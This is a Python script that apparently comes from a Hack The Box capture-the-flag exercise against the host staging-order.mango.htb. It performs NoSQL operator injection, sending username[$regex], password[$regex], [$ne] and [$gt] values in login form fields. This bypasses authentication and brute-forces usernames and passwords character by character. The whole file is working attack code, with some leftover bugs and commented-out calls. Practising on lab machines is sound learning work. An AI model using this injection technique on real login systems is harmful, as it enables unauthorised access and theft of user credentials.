import requests
import string
import sys

def brute_password(user):
    password = ""
    while True:
        for c in string.ascii_letters + string.digits + string.punctuation:
            if c in ["*", "+", ".", "?", "|", "\\"]:
                continue
            sys.stdout.write(f"\r[+] Password: {password}{c}")
            sys.stdout.flush()
            resp = requests.post(
                "http://staging-order.mango.htb/",
                data={
                    "username": user,
                    "password[$regex]": f"^{password}{c}.*",
                    "login": "login",
                },
            )
            if "We just started farming!" in resp.text:
                password += c
                resp = requests.post(
                    "http://staging-order.mango.htb/",
                    data={"username": user, "password": password, "login": "login"},
                )
                if "We just started farming!" in resp.text:
                    print(f"\r[+] Found password for {user}: {password.ljust(20)}")
                    return
                break

def brute_user(res):
    # Function to brute-force usernames
    found = False
    for c in string.ascii_letters + string.digits:
        sys.stdout.write(f"\r[*] Trying Username: {res}{c.ljust(20)}")
        sys.stdout.flush()
        resp = requests.post(
            "http://staging-order.mango.htb/",
            data={
                "username[$regex]": f"^{res}{c}",
                "password[$gt]": "",
                "login": "login",
            },
        )
        if "We just started farming!" in resp.text:
            found = True
            print(f"\r[+] Found user: {res}{c.ljust(20)}")
            brute_user(res + c)
            break
    if not found:
        print(f"\r[+] User found: {res.ljust(20)}")
        # brute_password(res)

def brute_initials():
    initials = []
    for char in string.ascii_letters:
        sys.stdout.write(f"\r[*] Trying Username Initials: {char.ljust(20)}")
        sys.stdout.flush()
        resp = requests.post(
            "http://staging-order.mango.htb/",
            data={
                "username[$regex]": f"^{char}",
                "password[$ne]": "",
                "login": "login",
            },
        )
        if "We just started farming!" in resp.text:
            found = True
            print(f"\r[+] Found Username Initials with: {char.ljust(20)}")
    sys.stdout.flush()
    return initials

if __name__ == "__main__":
    print("Starting brute-force attack...")
    brute_initials()
    # brute_user("")
